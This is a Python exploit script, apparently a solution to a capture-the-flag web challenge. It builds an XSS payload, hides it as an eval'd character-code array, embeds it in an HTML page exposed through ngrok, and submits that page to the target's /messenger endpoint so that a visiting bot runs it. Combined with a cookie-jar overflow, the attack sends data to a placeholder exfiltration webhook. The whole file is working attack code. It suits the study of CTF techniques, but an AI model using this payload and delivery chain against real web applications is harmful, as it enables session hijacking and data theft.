import requests
import asyncio
import json
from urllib.parse import quote_plus

"""Setup

You want:
- An exposed python server (server.py)
- A way to expose this python server to the world (ngrok http 10001)
- A target url
- An exfil url where you can view requests
- Then you run this script

"""

# XSS in navigable URL + cookie jar overflow to deliver XSS on /fraternize

async def main():
    target_url = "http://lover-on-localhost.ctf.maplebacon.org"
    # target_url = "http://localhost:1337"
    local_url = "http://localhost:1337"
    exfil_url = "WEBHOOK_URL"
    ngrok_url = "NGROK_URL"
    local_server = ngrok_url #"http://localhost:10001"
    with open("script.js", "r") as f:
        js_body = f.read()
        js_body = js_body.replace("TARGET_URL", local_url).replace("EXFIL_URL", exfil_url)
        codepoints = [ord(c) for c in js_body]
        final_charcode_str = json.dumps(codepoints)
        final_charcode_str = final_charcode_str.replace(" ", "")
    with open("template.html", "r") as f:
        html_body = f.read()
        html_body = html_body.replace("URL_ENCODED", quote_plus(f"<script>eval(JSON.parse('{final_charcode_str}').map((c)=>String.fromCharCode(c)).join(''));</script>")).replace("TARGET_URL", local_url).replace("NGROK_URL", ngrok_url).replace("EXFIL_URL", exfil_url).replace("LOCAL_SERVER", local_server)
        with open("index.html", "w") as g:
            g.write(html_body)
    r = requests.post(f"{target_url}/messenger", data={"url": ngrok_url})
    # r = requests.post(f"{target_url}/messenger", data={"url": exfil_url})
    print(r.text)

if __name__ == '__main__':
    asyncio.run(main())
